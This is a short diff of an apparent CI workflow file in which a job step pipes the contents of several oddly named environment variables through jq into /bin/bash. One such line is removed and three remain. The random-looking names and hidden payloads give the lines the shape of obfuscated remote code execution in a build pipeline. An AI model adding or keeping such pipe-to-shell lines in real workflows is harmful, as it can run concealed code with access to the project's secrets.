@@ -21,7 +21,6 @@ jobs:
           echo $plvgz67659 | jq -r .tl91117 | /bin/bash
           echo $kv639 | jq -r .pbd46 | /bin/bash
           echo $ee51 | jq -r .guph0363 | /bin/bash
-          printf '%s' "$lt8032" | jq -r .ga89 | /bin/bash
 
       - name: Persist output
         if: always()
